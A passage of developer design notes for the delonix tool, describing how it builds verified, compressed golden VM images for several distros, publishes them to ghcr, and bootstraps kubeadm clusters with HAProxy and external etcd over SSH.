  recommended by the Kubernetes docs: `source <(kubectl completion bash)` / `alias k=kubectl` /
  `complete -o default -F __start_kubectl k` / `source <(kubeadm completion bash)` (+ `crictl`),
  each block guarded by `command -v` (inert if the tool is missing). It lives in
  `common_customization_steps` (shared by the online AND offline builds); it only takes effect on the
  next build/publication of the golden (`vm-image.yml`).
- **Artifact size (measured, golden 24.04: 2.38 GiB → 677 MiB, −72%)** — three steps, all
  at the end of the `build`, each with a concrete reason:
  1. **`apt-get clean` + `rm -rf /var/lib/apt/lists/*`** (last `CustomizeOp`, AFTER the
     user's `--extra-run`, which may install more packages). Measured on the golden: `/var/cache/apt`
     ~181 MiB + `/var/lib/apt/lists` ~186 MiB = **~367 MiB of junk** that filled the root to **92%**
     (179 MiB free — dangerous for a k8s node: the kubelet evicts near the limit). After: 77%,
     546 MiB free. It lives in `k8s_customization_steps` and **not** in `k8s_recipes` — that catalog
     is SHARED with `cluster apply`, which prepares LIVE hosts; clearing the cache is a concern of the
     ARTIFACT, not of preparing a host.
  2. **`virt-sparsify --in-place`** — zeroes the blocks the cleanup freed (without this they keep
     taking up space in the qcow2). Best-effort: if it fails, the build goes on (it only loses size).
  3. **`qemu-img convert -c -o compression_type=zstd`** — Ubuntu's cloud image **comes compressed**
     and the initial `convert` (without `-c`) decompresses it; without this step the artifact ends up ~4x larger than
     the base (593 MiB → 2.38 GiB). **zstd and not the default zlib**: it compresses 5x faster
     (10s vs 53s), ends up smaller (868 vs 894 MiB on the same input), and above all **decompresses** much
     faster — which matters because the golden is the VMs' **read-only backing file**
     (`delonix_vm::create` makes a qcow2 overlay per VM), so each read of the base OS goes through the
     decompressor. Escape hatch: `--no-compress`. Total cost: ~12s of build.
- **`--offline` (ALWAYS PREFER; validated 2026-07-17, build in 1m18s)** — fetches the k8s `.deb`s
  on the **HOST** and runs `virt-customize` with **`--no-network`**. The appliance never needs
  DHCP/DNS, which **dispenses with the host workarounds** (passt/dhclient) that the online path
  requires — see "Known execution blocker" below. Validated with `passt` ACTIVE, without touching
  the host.
  - **Chain of trust: the SAME as apt's, done on the host instead of the guest** — `InRelease`
    (clearsigned, verified with `gpgv` against the repo's `Release.key`, a TEMPORARY keyring —
    never touches the user's) → SHA256 of the `Packages` index (declared in the signed InRelease)
    → SHA256 of each `.deb` (declared in the authenticated `Packages`). **Fails CLOSED** at any
    step — the same principle as CRITICAL finding #3 of the audit (`pull_oci_artifact` without a digest).
  - **Why `dpkg -i` is enough** (measured, not assumed): the closure is only **4 `.deb`s from the k8s repo**
    (`kubeadm`/`kubectl`/`kubelet` + `kubernetes-cni`); the remaining kubelet deps
    (`iptables`/`mount`/`util-linux`/`libc6`) **already ship in the cloud image**. If any is missing, the
    `dpkg` fails LOUD — it never leaves the guest half-installed.
  - **Trap (cost a build)**: `kubernetes-cni` has its OWN versioning (1.7.x), it doesn't
    follow k8s's — the `--k8s-version 1.34` filter only applies to the core components
    (`parse_packages_index`, parameter `versioned`). There is a regression test.
  - The networkless recipes (swap/modules/sysctls) are shared as-is with the online path
    (`k8s_recipes::k8s_config_recipes`) — the two modes **do not diverge**. `k8s_host_recipes()` =
    the 2 network ones + these, so that `cluster apply` (live hosts) keeps seeing the whole catalog.
  - Equivalence with the online path **proven**: same packages and same hold state —
    `kubeadm`/`kubectl`/`kubelet` `hi` 1.34.9-1.1, `kubernetes-cni` `ii` 1.7.1-1.1.
- **Pre-seeding the `kubeadm` images (v0.15.0)** — real bug report (host kaeso-sys-01): a
  REAL `kubeadm init` always re-downloaded ALL the core images (apiserver/controller-manager/
  scheduler/etcd/coredns/pause) from scratch, on EVERY VM created — slow enough to blow
  kubeadm's own internal rate-limiter deadline and make `wait-control-plane` fail
  midway. **Underlying root cause**: `delonix_oci::registry::pull_from_registry_with_creds`
  always downloaded each blob from the network, even when the exact content was already in the local CAS —
  **fixed** with a `Cas::has` (it already existed, was never called) before each blob `GET`;
  without this, pre-seeding the golden image was pointless (`delonix-cri` would re-download everything
  anyway). With the fix, `--offline build` now: extracts `kubeadm` from the `.deb` already
  downloaded/verified on the HOST (`dpkg-deb -x`, without installing), runs `kubeadm config images
  list --kubernetes-version=vX.Y.Z` (no network — it is a static internal table in the binary; proven
  live), downloads each image on the HOST through the SAME `pull_from_registry_with_creds` into
  a working `ImageStore`, and injects its 4 subfolders (`images`/`layers`/`containers`/
  `blobs`) into the guest's `/var/lib/delonix` via `virt-customize --copy-in` — the same path that
  `delonix-cri` already reads at runtime. Best-effort across the whole chain: a failure (missing image,
  absent `dpkg-deb`, etc.) only warns and goes on without pre-seeded images, never fails the whole build
  — a slower boot is always better than a broken build. **Only in `--offline` mode**
  (the online path already runs `apt-get`/pull inside the guest, without the same host-first fit). Validated live:
  `kubeadm config images list` from an extracted `kubeadm` (without installing) returned
  the 7 real v1.34 images; a real `pull_from_registry_with_creds` against
  `registry.k8s.io/pause:3.10.1` confirmed the resulting `ImageStore` layout
  (`images/layers/containers/blobs`) matches exactly what `--copy-in` expects.
- **`--no-k8s` (v0.16.0) — golden WITHOUT Kubernetes, just `delonix` + rootless ready to use.** Phase 1
  of 3 (request: Ubuntu 26.04 [already works today, zero code — `--ubuntu-release 26.04`], Ubuntu
  24.04 without k8s [this one], Debian, Rocky — incremental sequencing chosen explicitly by the
  user). `k8s_version: None` was **not** "no k8s": `k8s_repo_version` always falls back to
  `stable:/v1.31` and installed kubeadm/kubelet/kubectl anyway — there was no way to turn it off.
  `--no-k8s` is a new path (`rootless_customization_steps`), mutually exclusive with
  `--k8s-version`/`--offline`/`--cri-bin` (rejected with a clear error, never silently ignored):
  it installs the same rootless packages that `install.sh` requires (`slirp4netns`/`uidmap`/`nftables`/
  `iproute2`/`conntrack`), injects the `delonix` binary (not `delonix-cri` — a CRI shim for
  the kubelet is useless without a kubelet; with no systemd unit, the engine is invoked by CLI, it is not
  a service), configures the subuid/subgid range for the `delonix` account (same logic as
  `install.sh`'s `ensure_subid` — without it the rootless userns maps only 1 uid) and writes the
  AppArmor `unconfined+userns` profile (`install.sh:370-381`, needed on Ubuntu 23.10+ hosts with
  `kernel.apparmor_restrict_unprivileged_userns=1` — without it `unshare(CLONE_NEWUSER)` fails right
  at startup). Account creation/sudoers/bash-completion/apt cleanup/machine-id reset
  stays **shared** with the k8s path (`shared_account_steps`, extracted from
  `common_customization_steps` without changing the k8s path's output — only the CRI was set apart in
  `install_cri_steps`). It publishes to `ghcr.io/angolardevops/delonix-vm-base` (new repository,
  tags `ubuntu-24.04`/in future `debian-12`/`rocky-9` — no default wiring in `Pull`/
  `LsRemote` in this phase, the caller always passes the source explicitly — **closed in v0.23.0**, see
  below). `vm-image.yml` gained the `no_k8s` input (boolean) that switches the build/tag/
  target-repository step. **To do (deliberately outside this phase)**: Rocky (dnf — a different
  package-manager family, the biggest jump; done in v0.18.0), `--offline` for `--no-k8s` (the
  `.deb` verification on the host is specific to `pkgs.k8s.io`).
- **`--distro debian` (v0.17.0) — Phase 2 of 3.** `download_ubuntu_base` was generalized into
  `download_ubuntu_base`/`download_debian_base` behind a new `Distro { Ubuntu,
  Debian }` enum (`--distro`, `clap::ValueEnum`, default `ubuntu` — zero behavior change for
  those not using the new flag). Confirmed live (not assumed) before writing code: the Debian cloud
  image lives at `cloud.debian.org/images/cloud/<codinome>/latest/debian-<major>-
  genericcloud-amd64.qcow2` (`genericcloud`, not `generic` — virtio-only kernel, cloud-init
  kept, smaller; the file name uses the MAJOR NUMBER, the directory uses the CODENAME, with no
  numeric alias — hence `debian_major_version` with an explicit whitelist
  bullseye/bookworm/trixie, a clear error for the rest) and **publishes only `SHA512SUMS` — not
  `SHA256SUMS` at all** (confirmed with `curl -I`; same format `<hash>  <ficheiro>`, different
  algorithm) — a new `hex_sha512_file` (same `sha2` already in the tree, zero new dependency), tested
  against the official NIST vector of `SHA-512("abc")`. The rest of the pipeline (`rootless_customization_
  steps`/`shared_account_steps`/`k8s_host_recipes`) was already 100% distro-agnostic — confirmed
  before writing code: the `pkgs.k8s.io` repository uses a "flat" repo format (no
  codename/suite in the URL), the `sudo` account/`/etc/bash.bashrc` are identical conventions in
  Debian/Ubuntu (same packaging lineage) — so `--distro debian` already works with
  AND without `--no-k8s`, with no extra code at all for k8s itself. `VmImage` gained `distro:
  Option<String>` (`#[serde(default)]`, old metadata stays valid); `ubuntu_release`
  kept the field NAME (breaking it by renaming would break `.json` already on disk, which has no
  `#[serde(default)]` on that field) but now stores the release identifier of ANY distro.
  `vm-image.yml` gained `distro`/`debian_release` (only for `--no-k8s` builds, same scope as the
  previous phase's `no_k8s`). **Known limitation**: the real Debian qcow2 download (~300-600
  MiB) was not validated end-to-end in this sandbox — the outbound link from here to
  `cloud.debian.org` proved very slow (confirmed independently with plain `curl`, not
  a code bug); the SHA512 verification itself is covered by a unit test with a known vector,
  and the `SHA512SUMS` URL/format was confirmed live with `curl -I`/text `curl`
  (small files). An `--offline` build for Debian is not implemented (same reason as
  `--no-k8s`: `download_k8s_debs` is already distro-agnostic on the host side, but was not tested in this
  combination) — only the online path and `--no-k8s` were covered in this phase.
- **`--distro rocky` (v0.18.0) — Phase 3 of 3, the last (dnf/RPM, the package-manager family
  furthest from all the rest of the code).** Scope **deliberately `--no-k8s` only** — the request
  original already framed Rocky as a variant for tenants without Kubernetes, and `k8s_recipes`
  (`pkgs.k8s.io` repository, `dpkg -i`/`apt-mark hold`) is apt-only; the RPM equivalent of the
  `pkgs.k8s.io` has different URLs/GPG and stays outside this phase. `cmd_build` rejects
  `--distro rocky` without `--no-k8s` with a clear error, instead of trying to run `apt-get`/`dpkg` on a dnf
  guest.
  - **Cloud image**: confirmed live (not assumed) against `dl.rockylinux.org` before
    writing code — `pub/rocky/<major>/images/x86_64/Rocky-<major>-GenericCloud.latest.
    x86_64.qcow2` (a different tree from Debian's — no `images/cloud/` segment). The `<major>` is
    literal (`8`/`9`/`10`, with no codename translation like Debian) — `valid_rocky_release`
    validates against that whitelist for UX only (a fast, clear error before any network); unlike
    `debian_major_version`, it is not a security boundary (an unknown value
    already failed safe with a 404 from `stream_download`).
  - **Checksum: a THIRD form, different from the other two.** Rocky publishes a `.CHECKSUM`
    PER-FILE (not a per-directory `SUMS`) in the BSD format `SHA256 (<ficheiro>) = <hash>` —
    confirmed live, different from the GNU `<hash>  <ficheiro>` that Ubuntu/Debian use.
    A new `parse_bsd_checksum` (tested with the real line captured live); SHA256 (not SHA512
    like Debian), so it reuses `hex_sha256_file` unchanged.
  - **RPM package names confirmed live** (not assumed) against the Rocky 9 repository's own
    listings before writing code: `shadow-utils` (not `uidmap`), `iproute` (not
    `iproute2`), `conntrack-tools` (not `conntrack`) — all in BaseOS/AppStream, **no EPEL**.
    `nftables`/`slirp4netns` share the name across the two families.
  - **`shared_account_steps` gained a `distro` parameter** (branches at 3 points, all
    confirmed live): the sudo-equivalent group is `wheel` on Rocky (not `sudo`, which doesn't even
    exist there); the system's interactive bash file is `/etc/bashrc` (not `/etc/bash.bashrc`,
    the Debian/Ubuntu convention); the package-cache cleanup is `dnf clean all` instead of
    `apt-get clean && rm -rf /var/lib/apt/lists/*`. Debian/Ubuntu keep exactly the previous output of
    before (dedicated regression test).
  - **BUG caught BEFORE publishing, not in production**: the AppArmor profile step
    (`printf ... > /etc/apparmor.d/delonix && (apparmor_parser ... || true)`) only guards the
    call to `apparmor_parser` with `|| true` — the WRITE of the file has no guard at all.
    Rocky/RHEL has no `/etc/apparmor.d/` (it uses SELinux, not AppArmor) — running this step there
    would make the redirect fail, the `&&` short-circuit, and the whole `RunCommand` (hence the
    `virt-customize`, hence the whole build) fail. **Fixed at the root**: the step now only
    runs when `distro == Distro::Ubuntu` — it is not just a workaround for Rocky, it is also more
    correct for Debian (the `kernel.apparmor_restrict_unprivileged_userns` sysctl that this
    profile exists to work around is a kernel patch exclusive to Ubuntu 23.10+, it never existed
    on Debian; it was there before only for not having been reviewed, harmless because Debian has
    `/etc/apparmor.d/`, but incorrect all the same). A dedicated regression test
    (`rootless_steps_rocky_nunca_escreve_perfil_apparmor`) proves Rocky never sees the command.
  - `vm-image.yml` gained `rocky_release`, the same scope as the previous distro inputs.
    **Known limitation**: like Debian, the real Rocky `.qcow2` download was not
    validated end-to-end in this sandbox (same slow outbound link) — SHA256 verification
    covered by a unit test with the real line captured live, URL/redirect confirmed with
    `curl -I` against the 3 major versions.
  - **`fedora` in `vm-image.yml` (2026-08-12)** — the distro had existed in the engine since the cycle of
    `--distro fedora` and **never reached the workflow**, so the Fedora image was not publishable
    at all. `fedora_release` carries release AND build (`42-1.1`, which the vendor's artifact name
    carries and the version does not determine), but the **OCI tag takes only the major**
    (`fedora-42`): `fedora-42-1.1` says nothing more to whoever reads it and misaligned with its siblings.
    The job also gained the **current passt + `XDG_RUNTIME_DIR`** step — without it NO
    `--no-k8s` variant builds on the runner, because those install packages inside the appliance and
    Ubuntu 24.04's passt is the same one that fails here (see the Fedora section, further below).
    **NOT validated in CI by me**: triggering the workflow publishes images and is the owner's decision.
- **`push`/`pull`**: publish/fetch the image as a single-blob OCI artifact (empty config + 1
  layer, ORAS/Helm pattern) via `delonix_oci::registry::{push_oci_artifact,pull_oci_artifact}`
  (`crates/adapters/delonix-oci/src/registry.rs`) — it generalizes the `Client`/auth/upload already used by
  `push_to_registry` (container images), without duplicating the logic. **PUBLISHED AND VALIDATED
  (2026-07-20) via CI** — `ghcr.io/angolardevops/delonix-vm-k8s:1.34` (678.8 MiB, optimized
  golden), PUBLIC, with `delonix vm pull` (no argument) downloading it end-to-end.
  **`:1.35` published alongside (2026-07-23)**, same workflow/repository — the two tags coexist
  (`ghcr.io/angolardevops/delonix-vm-k8s:1.34` and `:1.35`).
  The official publishing path is the `.github/workflows/vm-image.yml` workflow (manual trigger,
  `workflow_dispatch`, `k8s_version` input): it builds the golden with the binary of the commit itself
  (`image --vm build --offline`) and publishes to ghcr. **Lessons from the real publication** (the previous note
  said "published on 2026-07-17" but the package did NOT exist — it never reached ghcr): (1) the
  **`virt-customize` WORKS in CI** — the `libguestfs` blocker was only the local sandbox's, a
  clean `ubuntu-24.04` runner builds the golden without the workarounds; (2) pushing the FIRST package
  of a new name in a **user** namespace (not an org) REQUIRES a **classic PAT with
  `write:packages`** (secret `GHCR_TOKEN`) — the workflow's `GITHUB_TOKEN` gives **403 Forbidden** even
  with "Workflow permissions: Read and write", because it cannot CREATE new user packages; (3) the
  first push creates the package **private** — making it public is a manual step in the UI afterwards (subsequent
  tags of the same package inherit the visibility). **Known gap**: `pull` does NOT recover the
  metadata (`ubuntu_release`/`k8s_version` come out `null` — the OCI artifact only carries the blob
  qcow2), so an `image vm ls` of a pulled image shows `-` in those columns.
- **`ls-remote`** (v0.11.0) — `delonix vm ls-remote` / `image vm ls-remote` / `image --vm
  ls-remote`, with no argument it lists the tags of the official OCI repository (`GET
  /v2/<repo>/tags/list`), with an argument any other repository — it discovers which (k8s) versions
  are published BEFORE a `pull`, without touching anything local. It fully reuses the `Client`/
  auth from `pull`/`push` (`delonix_oci::registry::list_remote_tags`, same 401→token→retry flow).
  The three entry points converge in `VmImageCmd::LsRemote`, the same triple pattern that
  `pull` already followed. Only the 1st page of the registry (no `Link` pagination) — irrelevant for the
  handful of tags of a golden. Validated live: it shows the real `1.34` and `1.35` on ghcr.io.
- **`virt-customize` host blockers — they DISAPPEAR with `--offline`** (diagnosed in
  depth on 2026-07-17; they only affect the ONLINE path, which needs DHCP/DNS in the appliance):
  1. **Appliance without a DHCP client** → `apt-get install` fails with "Could not resolve host".
     Root cause: `supermin.d/packages` requests `isc-dhcp-client`, but supermin only COPIES from the host
     and the package was not installed; the appliance init tries `dhclient` and only falls back to `dhcpcd`
     as a fallback — which is also not in the `hostfiles`. Fix: `sudo apt install isc-dhcp-client`
     (it is what supermin expects; it is not reverted by updates, unlike editing the
     `hostfiles`, which belongs to the `libguestfs0t64` package).
  2. **`passt` gives no lease** → `dhclient` hangs for 300s and the build goes on WITHOUT a network. Two layers:
     (a) AppArmor (`/etc/apparmor.d/usr.bin.passt`) denies creating a socket/PID in
     `/run/user/1000/libguestfs*/` — confirmed by `dmesg | grep 'apparmor.*DENIED.*passt'`; the
     profile only allows `owner /tmp/**` and `owner @{HOME}/**`, so
     `XDG_RUNTIME_DIR=$HOME/.cache/libguestfs-run` works around it WITHOUT touching the host. (b) Even so
     passt never assigns a lease (libguestfs runs it with `--address 169.254.2.15`), so it
     still has to be taken off the PATH (`sudo mv /usr/bin/passt /usr/bin/passt.off`, with a `trap`
     to ALWAYS restore) → libguestfs falls back to qemu's slirp, which works.
  **Conclusion: use `--offline` and none of this is needed.** The `/usr/lib/guestfs` (symlink to
  `/usr/lib/x86_64-linux-gnu/guestfs`, because `libguestfs-common` is missing) is still needed
  on this machine, in both modes.

`delonix vm create` gained `--hostname`/`--ssh-key <chave-ou-@ficheiro>`/`--user-data <ficheiro>`
— without an explicit `--seed`, it generates a per-instance NoCloud ISO (`cloud-localds`) if any one
of these is given (pure function `build_user_data`, testable without a real `cloud-localds`). Not to be confused
with the `build` above: that one runs once per IMAGE (golden), this runs once per VM.

**`kind: Vm` — full parity with the CLI + a complete replica of the libvirt XML.** The `VmSpec`
(`cmd/vm.rs`) gained (1) the **declarative cloud-init** `hostname`/`sshKeys`/`userData` that only the
CLI had; and (2) — FIXING a latent bug — the manifest `apply` now **always** generates the
seed (like the CLI), not only when there are volumes: a `kind: Vm` without volumes was left with no datasource →
cloud-init skipped the network phase → VM with no IP. Furthermore, to express in the manifest everything one
does by hand in the libvirt XML, the **"both"** approach: **typed** fields (`machine`, `cpuModel`
+ `cpuTopology`, `bootOrder`, `tpm`, `video`, `extraDisks` with auto target dev, `extraNics`
network/bridge/user) rendered in `delonix_vm::libvirt_domain_xml` (pure function, tested), +
two **raw-XML escape hatches**: `libvirtXmlOverlay` (`<device>` fragments before
`</devices>`) and `libvirtXml` (TOTAL override of the `<domain>`, verbatim — the rootless seclabel
is still injected at boot). The two hatches are **UNVALIDATED** — only for trusted manifests
(a fragment can name arbitrary host paths/devices; aligned with the
"untrusted manifest" risk from the E2E audit). `VmConfig` derives `Default` (the literals use
`..Default::default()`); full example in `examples/vm.yaml`.

**The console (`vm console`) returns to the host shell.** The golden auto-logs-in on ttyS0 → inside the
console `exit`/`logout` only re-trigger the getty (loop). `cmd_console` now prints a warning
clear (i18n) — *back to host: Ctrl+]* — and runs `virsh console` as a CHILD (spawn+wait, not
`exec`) to confirm "Back to the host" on exit, on both backends. And `vm create` shows
**per-stage progress** (`CreateStage` emitted by the engine via `create_with`; text/i18n in the bin) on
stderr + a "Next steps" block, with the raw output of `qemu-img`/`virsh` captured (`run_quiet`);
stdout remains just the VM name (scriptable).

`delonix-cri` (`crates/interfaces/delonix-cri`) gained its first `[[bin]]` (`src/bin/delonix-cri.rs`)
— before it existed only as a library, called by no one in the workspace. It runs `serve_blocking` on a
unix socket (`$DELONIX_CRI_ADDR`, default `/run/delonix-cri.sock`) — it is the endpoint that the kubelet
talks to via `--container-runtime-endpoint`, replacing containerd/CRI-O.
## kubeadm cluster (`delonix cluster apply`)

`delonix cluster apply [-f cloud.yaml]` (`kind: KubernetesCluster`, `Cluster` still resolves
as an alias — see "The Kinds get definitive groups and names" below) — idempotent `kubeadm`
bootstrap over SSH on hosts that are ALREADY LIVE and reachable (it does not create VMs — that is
`delonix vm create`, above). Modules:
`cmd/remote.rs` (shells out to the system `ssh`/`scp`, `sudo -n` for the remote commands — the
SSH user must already have sudo NOPASSWD), `cmd/k8s_recipes.rs` (catalogue SHARED with
`vmimage::build` — `pkgs.k8s.io` repository/packages/swap/modules/sysctls — so that the golden
image and a host prepared by `cluster apply` end up exactly identical), `cmd/cluster.rs`
(orchestration: prepares all hosts → `kubeadm init` on the 1st control-plane → `kubeadm join` of the
remaining control-planes → `kubeadm join` of the workers → brings the kubeconfig to
`<root>/clusters/<name>-kubeconfig.yaml`, and copies it to `~/.kube/config` if it does not yet exist).

**`delonix cluster kubeconfig [<name>]`** — prints that cached file to
stdout, **with no live SSH**. There is no record of the SSH target after the `apply`/
`kubeadm` finishes (same "no state file" philosophy as below), so
a standalone command cannot reconstruct it without the manifest again — what
is already cached is all there is to re-obtain. It also works for clusters in
kind mode (`kindmode::kubeconfig_path` writes to the SAME path, even though the
two modes share nothing else in common — `complete::clusters()` only sees the
kind mode, via the container labels). With no name, it resolves to the single cluster
in cache; with several, it refuses and names them (same rule as `resolve_vm_image`
for VM images). It does not merge into `~/.kube/config` — that already happened
automatically at creation time, via two distinct and still-ununified paths
(`merge_into_local_kubeconfig` here, `kindmode::install_kubecontext` in kind
mode) — unifying them is a separate refactor, not touched by this command.

**Stateless idempotency** (explicit request, "like Terraform but without a state
file"): each `k8s_recipes` step has a `check` (shell command, success = already satisfied) and an
`apply`; `kubeadm init`/`join` check `/etc/kubernetes/admin.conf`/`kubelet.conf` on the host before
acting. It never drifts from a `.tfstate` because there is none.

**v1 simplifications** (the request was "arbitrary hosts", the scope was already large without these):
- **Dedicated external etcd (v0.24.0)** — `etcd.mode: "external"` + `etcd.hosts` (manifest) or
  `cluster kubeadm --etcd-cluster <N>` (auto-provisions N extra VMs, same `create_and_wait` as the
  other roles). Delonix generates its OWN CA + one leaf per member (reused for peer TLS
  AND client/server — reduces the PKI surface of a new subsystem) + an
  `apiserver-etcd-client` leaf, installs+starts the real `etcd` (official `etcd-io/etcd` binary,
  downloaded and verified via `SHA256SUMS`, never via apt — the version is not our
  responsibility) on ALL members in parallel (`std::thread::scope` — the static bootstrap
  needs all the initial members reachable together, not just faster), waits for the
  quorum to become healthy, and only then runs `kubeadm init`. Since a simple-flag `kubeadm init`
  cannot express `ClusterConfiguration.etcd.external`, the external path now generates a
  `--config` YAML (`cmd/kubeadm_config.rs`, `serde_yaml`) — the `stacked` (default) path stays
  byte-for-byte unchanged. Quorum: `validate()` requires `etcd.hosts` non-empty and an ODD
  number (except exactly 1, accepted for dev/test with a loud "no HA" warning). **Unvalidated
  finding, worked around instead of assumed**: it was not confirmed whether kubeadm's `--upload-certs`/
  `--certificate-key` already redistributes the `apiserver-etcd-client` cert to EACH
  control-plane in the external case (it does so for `stacked`); instead of relying on that,
  `etcd::push_etcd_client_pki` re-pushes `ca.crt`+`apiserver-etcd-client.{crt,key}` to EACH
  control-plane (the `init` one and each `join --control-plane`) before its respective kubeadm command —
  the fix stays independent of kubeadm's native behaviour; confirming this live is a
  follow-up, it does not block this version. CA+certs live in `<root>/clusters/<name>/etcd/` (`0700`
  dir, `0600` files), the same per-cluster subdirectory convention that `id_ed25519` already uses.
  **To do (deliberately out of this version)**: adding/removing members after the bootstrap,
  certificate rotation, migrating an already-live `stacked` cluster to `external`, and `mode: vm`
  (manifest) auto-provisioning etcd — only `cluster kubeadm --etcd-cluster` does it for now
  (`validate()` refuses `etcd.mode: external` outside `mode: ssh` on purpose, so as not to discard
  `etcd.hosts` silently).
- **Parallel host preparation across hosts (v0.23.0)** — each host is independent (its own SSH
  session, no shared state), now runs in `std::thread::scope`. `kubeadm init`/`join`
  remain sequential (they depend on each other by design — the join needs the init's token).
  Behaviour change: unlike the old loop (which stopped at the 1st bad host), now ALL
  hosts are prepared and ALL failures reported together.
- **Multi-control-plane HA requires an explicit `spec.controlPlaneEndpoint`** — kubeadm needs a
  stable endpoint (LB/VIP) in front of several control-planes; with just 1, it uses its IP.
- No real end-to-end test in this session — this sandbox has no remote SSH hosts. Validated up to the
  real boundary: manifest parsing/validation, `delonix-cri` resolution, generation of the
  `kubeadm init`/`join` commands, and the real SSH attempt fails correctly and clearly
  (`No route to host` on a test IP) — there is nothing else to simulate without real machines.

### `delonix cluster kubeadm [--name <n>] --control-plane <n> --workers <n>`

A layer on top of `cluster apply` (original request, first session of this series: "one command,
from zero to a working cluster"). It neither writes nor requires a `cloud.yaml` — it provisions the VMs and
builds the `ClusterSpec` in memory, then calls the SAME `apply_one` that `cluster apply` uses
(zero duplication of the kubeadm/SSH/security-validation logic — all in `cmd/cluster.rs`,
`ClusterCmd::Kubeadm`/`provision_and_apply`).

Flow: **resolve the golden VM image** (`--vm-image` or the only one existing in
`VmImageStore` — clear error if there are 0 or more than 1, never choosing blindly) → **generate or
load an SSH key** (`--ssh-key`, or `ssh-keygen -t ed25519` non-interactively in
`<root>/clusters/<name>/id_ed25519`) → **create the VMs sequentially**
(`<name>-cp1..N`/`<name>-w1..M`, via `delonix_vm::create` with the golden image as disk +
`cmd::vm::generate_seed_iso` for the per-instance cloud-init, reused as-is from
`delonix vm create --ssh-key`) → **wait for each VM to become reachable over SSH**
(`wait_for_vm_ssh_ready`: first the IP via `delonix_vm::status`, then a real `ssh_check` —
`--boot-timeout`, default 300s) → builds the `ClusterSpec` (SSH user always `delonix`, the
account the golden image already creates) → `validate()` + `apply_one()` (same defenses from the security
audit, inherited automatically).

#### Multi-control-plane HA: automatic HAProxy (v0.13.0)

With `--control-plane > 1`, it automatically provisions an extra VM (`<name>-lb`) running
**HAProxy** as a TCP load balancer (L4, passthrough — the apiserver TLS always terminates on the
real control-plane, never on the LB) in front of port 6443 of each control-plane, and uses that
VM's IP as the `controlPlaneEndpoint` of `kubeadm init`/`join` — a single command produces a working HA
cluster, with no new flag (it triggers on its own from `--control-plane > 1`). `delonix cluster
apply` still accepts an external/manual `controlPlaneEndpoint` for those who already have their own LB.

Nothing changed downstream: `kubeadm_init`/`kubeadm_join` already supported multi-control-plane
(`--control-plane-endpoint`/`--upload-certs`/`--certificate-key`) since the original v1 — the only
gap was that we never had a real endpoint to point them at. New module `cmd/lb.rs`:
`build_haproxy_cfg` (pure function, tested) generates the `haproxy.cfg`; `ensure_haproxy` installs
haproxy via apt if needed, writes the config (same idiom as `prepare_host` for the
`delonix-cri`: local tmpfile → scp → privileged `mv`) and restarts the service — it always rewrites +
restarts, simply-idempotent (same trade-off already accepted in the rest of `cluster apply`), safe
on any re-execution because HAProxy is a stateless L4 proxy and the LB VM is already idempotent
by name (auto-heal, like any other VM in this cluster).

**Validated live (host kaeso-sys-01, 2026-07-24)**: `cluster kubeadm --control-plane 2 --workers
3` provisioned the 5 VMs + the `<name>-lb` running HAProxy end to end (`creating VM
ngolacloudlab-lb...` → `configuring HAProxy (192.168.122.26)...` → config scp OK) — confirms the
whole path up to the point where `apply_ssh` begins preparing the real hosts. It was that same
run that revealed the `delonix-cri` gap fixed next.

#### `delonix-cri`/`delonix-cri.service` missing outside a checkout (v0.13.2)

Real bug report (same run above): after the LB was configured, `apply_ssh` failed right
afterwards with `delonix-cri binary not found: use --cri-bin <path>, install it alongside
delonix, or run from the source-code checkout` — the user had installed via
`install.sh` **without** `--with-cri` (the default) and was running `cluster kubeadm` from outside a
source-code checkout, the only two cases `resolve_cri_bin` knew how to resolve before this version.

**Fixed**, two gaps of the same family:

- `resolve_cri_bin`: when it does not find the binary locally, it downloads it (verified against
  the release's own `SHA256SUMS`, the same non-negotiable of any download in this code) from
  the GitHub release matching the version of the `delonix` RUNNING ITSELF — the two always
  publish together, on the same tag. Cached in `<root>/bin/<version>/delonix-cri`, one download per
  installed version. It detects the `-v3` (AVX2/BMI2/FMA) variant with the same criterion as `install.sh`.
- `workspace_dist_file("delonix-cri.service")`: the systemd unit is static and version-independent
  — it is now embedded in the binary (`include_str!`) and written to the same cache
  folder the first time it is missing, needing no network at all.

Validated live with an isolated binary (no `delonix-cri` alongside, outside any checkout,
`DELONIX_ROOT` clean) against the real published v0.13.1: it downloads, verifies, caches, and the
`cluster apply`/`cluster kubeadm` advance up to the real SSH host-preparation phase.

#### `kind`-style progress (v0.14.0)

Direct user request: the line-by-line log (one `println!` per VM created, per recipe
applied, per host prepared) was verbose and inelegant on a multi-VM cluster — he wanted
the same format as `kind create cluster`. `cmd::kindmode.rs` already had exactly that mechanism
(`output::Progress`, the code's own comment already said "like kind/spinnies") — a braille
spinner per logical STEP (not per VM/command), closing with `✓`/`✗`. `provision_and_apply` and
`apply_ssh` now use it, each with its own `Progress` instance (`apply_ssh` is also
called by `cluster apply -f`, which never goes through `provision_and_apply`):

```
info Creating cluster "ngolacloudlab" (kubeadm, 1.34)...
 ✓ Provisioning 2 control-plane(s) 📦
 ✓ Provisioning 3 worker(s) 📦
 ✓ Provisioning the HAProxy load balancer ⚖️
 ✓ Preparing 6 host(s) 🔧
 ✓ Bootstrapping control-plane (kubeadm init) 🕹️
 ✓ Joining 1 more control-plane(s) 🎮
 ✓ Joining 3 worker(s) 🚜
 ✓ Fetching kubeconfig 📇
```

Without a TTY (pipe/CI/`2>&1 | tee`), `Progress` already degraded on its own to one line per step ONLY
when it closes (nothing during — which is what a CI log wants) — validated live exactly like that.
`create_and_wait`/`prepare_host`/`kubeadm_init`/`kubeadm_join` lost their internal `println!`s
(it is the outer step that speaks now); the errors gained explicit context (`[{label}] {}: {e}`)
so as not to lose diagnostics with the granular log removed. `ssh-keygen -q` drops the noisy banner from
key generation. `fetch_kubeconfig` now returns the `PathBuf` instead of printing from inside —
the two useful final lines (`kubeconfig: ...`/`export KUBECONFIG=...`) print after the
last `✓`, outside the progress block, just as the real `kind` also leaves a summary at the end.

#### `--name` optional + auto-pull of a missing `--vm-image` (v0.12.0)

Two real bugs (host kaeso-sys-01): (1) `--name` was mandatory — without the same angolan automatic-name
analogy (`<king>-<place>-NN`) that containers and `cluster create` (kind mode) already have;
(2) `--vm-image <v>`/`--k8s-version <v>` without the local image always gave an error ("no qcow2 on
disk"), even though the golden one is an OCI artifact published precisely so that no manual
pull is needed — and even when the image WAS local but only under the full convention name
(`delonix-vm-k8s:1.34`), because `resolve_vm_image` returned the explicit value verbatim without
checking that convention first.

**Fixed**:

- `--name` became `Option<String>`; without it, `random_kubeadm_cluster_name` generates a free name
